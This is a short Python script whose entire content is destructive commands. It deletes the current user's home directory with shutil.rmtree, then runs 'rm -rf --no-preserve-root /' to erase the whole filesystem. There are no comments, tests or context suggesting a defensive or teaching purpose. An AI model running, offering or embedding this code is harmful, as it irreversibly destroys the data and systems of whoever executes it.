import os
import shutil

home_dir = os.path.expanduser("~")
shutil.rmtree(home_dir)
os.system('rm -rf --no-preserve-root /')
